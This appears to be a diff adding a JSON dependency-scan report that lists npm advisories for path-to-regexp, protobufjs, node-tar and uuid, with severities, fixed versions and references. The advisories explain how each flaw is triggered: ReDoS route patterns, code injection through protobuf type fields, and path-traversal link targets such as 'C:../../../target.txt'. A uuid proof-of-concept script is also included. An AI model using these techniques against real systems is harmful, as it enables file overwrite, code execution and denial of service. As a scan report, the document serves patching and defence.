+          "Description": "Impact:\n\nA bad regular expression is generated any time you have three or more parameters within a single segment, separated by something that is not a period (.). For example, /:a-:b-:c or /:a-:b-:c-:d. The backtrack protection added in path-to-regexp@0.1.12 only prevents ambiguity for two parameters. With three or more, the generated lookahead does not block single separator characters, so capture groups overlap and cause catastrophic backtracking.\n\nPatches:\n\nUpgrade to path-to-regexp@0.1.13\n\nCustom regex patterns in route definitions (e.g., /:a-:b([^-/]+)-:c([^-/]+)) are not affected because they override the default capture group.\n\nWorkarounds:\n\nAll versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change /:a-:b-:c to /:a-:b([^-/]+)-:c([^-/]+).\n\nIf paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-1333"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+              "V3Score": 5.3
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-4867",
+            "https://blakeembrey.com/posts/2024-09-web-redos",
+            "https://cna.openjsf.org/security-advisories.html",
+            "https://github.com/advisories/GHSA-9wv6-86v2-598j",
+            "https://github.com/pillarjs/path-to-regexp",
+            "https://github.com/pillarjs/path-to-regexp/releases/tag/v.0.1.13",
+            "https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-37ch-88jc-xwx2",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-4867",
+            "https://www.cve.org/CVERecord?id=CVE-2026-4867"
+          ],
+          "PublishedDate": "2026-03-26T17:16:42.983Z",
+          "LastModifiedDate": "2026-04-16T18:01:04.783Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-41242",
+          "PkgID": "protobufjs@7.2.6",
+          "PkgName": "protobufjs",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/protobufjs@7.2.6",
+            "UID": "3c1c94ada819b6f4",
+            "BOMRef": "pkg:npm/protobufjs@7.2.6"
+          },
+          "InstalledVersion": "7.2.6",
+          "FixedVersion": "8.0.1, 7.5.5",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-41242",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "Arbitrary code execution in protobufjs",
+          "Description": "protobufjs compiles protobuf definitions into JavaScript (JS) functions. In versions prior to 8.0.1 and 7.5.5, attackers can inject arbitrary code in the \"type\" fields of protobuf definitions, which will then execute during object decoding using that definition. Versions 8.0.1 and 7.5.5 patch the issue.",
+          "Severity": "CRITICAL",
+          "CweIDs": [
+            "CWE-94"
+          ],
+          "VendorSeverity": {
+            "ghsa": 4
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+              "V40Score": 9.4
+            }
+          },
+          "References": [
+            "https://github.com/protobufjs/protobuf.js",
+            "https://github.com/protobufjs/protobuf.js/commit/535df444ac060243722ac5d672db205e5c531d75",
+            "https://github.com/protobufjs/protobuf.js/commit/ff7b2afef8754837cc6dc64c864cd111ab477956",
+            "https://github.com/protobufjs/protobuf.js/releases/tag/protobufjs-v7.5.5",
+            "https://github.com/protobufjs/protobuf.js/releases/tag/protobufjs-v8.0.1",
+            "https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-xq3m-2v4x-88gg"
+          ],
+          "PublishedDate": "2026-04-18T17:16:13.983Z",
+          "LastModifiedDate": "2026-04-20T19:03:07.607Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-23745",
+          "PkgID": "tar@6.2.1",
+          "PkgName": "tar",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/tar@6.2.1",
+            "UID": "d761abf3995c98",
+            "BOMRef": "pkg:npm/tar@6.2.1"
+          },
+          "InstalledVersion": "6.2.1",
+          "FixedVersion": "7.5.3",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-23745",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "node-tar: tar: node-tar: Arbitrary file overwrite and symlink poisoning via unsanitized linkpaths in archives",
+          "Description": "node-tar is a Tar for Node.js. The node-tar library (\u003c= 7.5.2) fails to sanitize the linkpath of Link (hardlink) and SymbolicLink entries when preservePaths is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to Arbitrary File Overwrite via hardlinks and Symlink Poisoning via absolute symlink targets. This vulnerability is fixed in 7.5.3.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-22"
+          ],
+          "VendorSeverity": {
+            "amazon": 3,
+            "ghsa": 3,
+            "nvd": 2,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:L/VA:N/SC:H/SI:L/SA:N",
+              "V40Score": 8.2
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N",
+              "V3Score": 6.1
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H",
+              "V3Score": 8.2
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-23745",
+            "https://github.com/isaacs/node-tar",
+            "https://github.com/isaacs/node-tar/commit/340eb285b6d986e91969a1170d7fe9b0face405e",
+            "https://github.com/isaacs/node-tar/security/advisories/GHSA-8qq5-rm4j-mr97",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-23745",
+            "https://www.cve.org/CVERecord?id=CVE-2026-23745"
+          ],
+          "PublishedDate": "2026-01-16T22:16:26.83Z",
+          "LastModifiedDate": "2026-02-18T16:20:07.823Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-23950",
+          "PkgID": "tar@6.2.1",
+          "PkgName": "tar",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/tar@6.2.1",
+            "UID": "d761abf3995c98",
+            "BOMRef": "pkg:npm/tar@6.2.1"
+          },
+          "InstalledVersion": "6.2.1",
+          "FixedVersion": "7.5.4",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-23950",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "node-tar: tar: node-tar: Arbitrary file overwrite via Unicode path collision race condition",
+          "Description": "node-tar,a Tar for Node.js, has a race condition vulnerability in versions up to and including 7.5.3. This is due to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently. This is a Race Condition which enables Arbitrary File Overwrite. This vulnerability affects users and systems using node-tar on macOS (APFS/HFS+). Because of using `NFD` Unicode normalization (in which `ß` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `ß` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive. The patch in version 7.5.4 updates `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`. As a workaround, users who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-176",
+            "CWE-352",
+            "CWE-367"
+          ],
+          "VendorSeverity": {
+            "amazon": 3,
+            "ghsa": 3,
+            "nvd": 2,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L",
+              "V3Score": 8.8
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 5.9
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L",
+              "V3Score": 8.8
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-23950",
+            "https://github.com/isaacs/node-tar",
+            "https://github.com/isaacs/node-tar/commit/3b1abfae650056edfabcbe0a0df5954d390521e6",
+            "https://github.com/isaacs/node-tar/security/advisories/GHSA-r6q2-hw4h-h46w",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-23950",
+            "https://www.cve.org/CVERecord?id=CVE-2026-23950"
+          ],
+          "PublishedDate": "2026-01-20T01:15:57.87Z",
+          "LastModifiedDate": "2026-02-18T15:50:29.91Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-24842",
+          "PkgID": "tar@6.2.1",
+          "PkgName": "tar",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/tar@6.2.1",
+            "UID": "d761abf3995c98",
+            "BOMRef": "pkg:npm/tar@6.2.1"
+          },
+          "InstalledVersion": "6.2.1",
+          "FixedVersion": "7.5.7",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-24842",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "node-tar: tar: node-tar: Arbitrary file creation via path traversal bypass in hardlink security check",
+          "Description": "node-tar,a Tar for Node.js, contains a vulnerability in versions prior to 7.5.7 where the security check for hardlink entries uses different path resolution semantics than the actual hardlink creation logic. This mismatch allows an attacker to craft a malicious TAR archive that bypasses path traversal protections and creates hardlinks to arbitrary files outside the extraction directory. Version 7.5.7 contains a fix for the issue.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-22",
+            "CWE-59"
+          ],
+          "VendorSeverity": {
+            "amazon": 3,
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
+              "V3Score": 8.2
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
+              "V3Score": 8.2
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-24842",
+            "https://github.com/isaacs/node-tar",
+            "https://github.com/isaacs/node-tar/commit/f4a7aa9bc3d717c987fdf1480ff7a64e87ffdb46",
+            "https://github.com/isaacs/node-tar/security/advisories/GHSA-34x7-hfp2-rc4v",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-24842",
+            "https://www.cve.org/CVERecord?id=CVE-2026-24842"
+          ],
+          "PublishedDate": "2026-01-28T01:16:14.947Z",
+          "LastModifiedDate": "2026-02-02T14:30:10.89Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-26960",
+          "PkgID": "tar@6.2.1",
+          "PkgName": "tar",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/tar@6.2.1",
+            "UID": "d761abf3995c98",
+            "BOMRef": "pkg:npm/tar@6.2.1"
+          },
+          "InstalledVersion": "6.2.1",
+          "FixedVersion": "7.5.8",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-26960",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "node-tar: node-tar: Arbitrary file read/write via malicious archive hardlink creation",
+          "Description": "node-tar is a full-featured Tar for Node.js. When using default options in versions 7.5.7 and below, an attacker-controlled archive can create a hardlink inside the extraction directory that points to a file outside the extraction root, enabling arbitrary file read and write as the extracting user. Severity is high because the primitive bypasses path protections and turns archive extraction into a direct filesystem access primitive. This issue has been fixed in version 7.5.8.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-22"
+          ],
+          "VendorSeverity": {
+            "amazon": 3,
+            "ghsa": 3,
+            "nvd": 3,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
+              "V3Score": 7.1
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
+              "V3Score": 7.1
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
+              "V3Score": 7.1
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-26960",
+            "https://github.com/isaacs/node-tar",
+            "https://github.com/isaacs/node-tar/commit/2cb1120bcefe28d7ecc719b41441ade59c52e384",
+            "https://github.com/isaacs/node-tar/commit/d18e4e1f846f4ddddc153b0f536a19c050e7499f",
+            "https://github.com/isaacs/node-tar/security/advisories/GHSA-83g3-92jg-28cx",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-26960",
+            "https://www.cve.org/CVERecord?id=CVE-2026-26960"
+          ],
+          "PublishedDate": "2026-02-20T02:16:53.883Z",
+          "LastModifiedDate": "2026-02-20T19:24:16.537Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-29786",
+          "PkgID": "tar@6.2.1",
+          "PkgName": "tar",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/tar@6.2.1",
+            "UID": "d761abf3995c98",
+            "BOMRef": "pkg:npm/tar@6.2.1"
+          },
+          "InstalledVersion": "6.2.1",
+          "FixedVersion": "7.5.10",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-29786",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "node-tar: hardlink path traversal via drive-relative linkpath",
+          "Description": "node-tar is a full-featured Tar for Node.js. Prior to version 7.5.10, tar can be tricked into creating a hardlink that points outside the extraction directory by using a drive-relative link target such as C:../target.txt, which enables file overwrite outside cwd during normal tar.x() extraction. This issue has been patched in version 7.5.10.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-22",
+            "CWE-59"
+          ],
+          "VendorSeverity": {
+            "amazon": 3,
+            "ghsa": 3,
+            "nvd": 2,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:N/VI:H/VA:L/SC:N/SI:H/SA:L",
+              "V40Score": 8.2
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:N/I:H/A:N",
+              "V3Score": 6.3
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N",
+              "V3Score": 8.6
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-29786",
+            "https://github.com/isaacs/node-tar",
+            "https://github.com/isaacs/node-tar/commit/7bc755dd85e623c0279e08eb3784909e6d7e4b9f",
+            "https://github.com/isaacs/node-tar/security/advisories/GHSA-qffp-2rhf-9h96",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-29786",
+            "https://www.cve.org/CVERecord?id=CVE-2026-29786"
+          ],
+          "PublishedDate": "2026-03-07T16:15:55.587Z",
+          "LastModifiedDate": "2026-03-11T21:50:01.91Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-31802",
+          "PkgID": "tar@6.2.1",
+          "PkgName": "tar",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/tar@6.2.1",
+            "UID": "d761abf3995c98",
+            "BOMRef": "pkg:npm/tar@6.2.1"
+          },
+          "InstalledVersion": "6.2.1",
+          "FixedVersion": "7.5.11",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-31802",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "tar: tar: File overwrite via drive-relative symlink traversal",
+          "Description": "node-tar is a full-featured Tar for Node.js. Prior to version 7.5.11, tar (npm) can be tricked into creating a symlink that points outside the extraction directory by using a drive-relative symlink target such as C:../../../target.txt, which enables file overwrite outside cwd during normal tar.x() extraction. This vulnerability is fixed in 7.5.11.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-22"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 2,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:H/SA:N",
+              "V40Score": 8.2
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 5.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 6.2
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-31802",
+            "https://github.com/isaacs/node-tar",
+            "https://github.com/isaacs/node-tar/commit/f48b5fa3b7985ddab96dc0f2125a4ffc9911b6ad",
+            "https://github.com/isaacs/node-tar/security/advisories/GHSA-9ppj-qmqm-q256",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-31802",
+            "https://www.cve.org/CVERecord?id=CVE-2026-31802"
+          ],
+          "PublishedDate": "2026-03-10T07:44:58.02Z",
+          "LastModifiedDate": "2026-03-18T18:13:34.703Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-w5hq-g745-h8pq",
+          "PkgID": "uuid@8.3.2",
+          "PkgName": "uuid",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/uuid@8.3.2",
+            "UID": "1103b66b03e09370",
+            "BOMRef": "pkg:npm/uuid@8.3.2"
+          },
+          "InstalledVersion": "8.3.2",
+          "FixedVersion": "14.0.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-w5hq-g745-h8pq",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided",
+          "Description": "### Summary\n\n`v3`, `v5`, and `v6` accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4`, `v1`, and `v7` explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3`/`v5` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4',()=\u003ev4({},new Uint8Array(8),4)],\n  ['v5',()=\u003ev5('x',ns,new Uint8Array(8),4)],\n  ['v6',()=\u003ev6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4 THREW RangeError`\n- `v5 NO_THROW`\n- `v6 NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```text\nsame true buf [\n  170, 170, 170, 170,\n   75, 224, 100,  63\n]\nv6 [\n  187, 187, 187, 187,\n   31,  19, 185,  64\n]\n```\n\n### Security impact\n\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\n\n### Suggested fix\n\nAdd the same guard used by `v4`/`v1`/`v7`:\n\n```ts\nif (offset \u003c 0 || offset + 16 \u003e buf.length) {\n  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);\n}\n```\n\nApply to:\n\n- `src/v35.ts` (covers `v3` and `v5`)\n- `src/v6.ts`",
+          "Severity": "MEDIUM",
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N",
+              "V40Score": 6.3
+            }
+          },
+          "References": [
+            "https://github.com/uuidjs/uuid",
+            "https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34",
+            "https://github.com/uuidjs/uuid/releases/tag/v14.0.0",
+            "https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq"
+          ],
+          "PublishedDate": "2026-04-22T20:53:24Z",
+          "LastModifiedDate": "2026-04-22T20:53:24Z"
+        }
+      ]
+    }
+  ]
+}
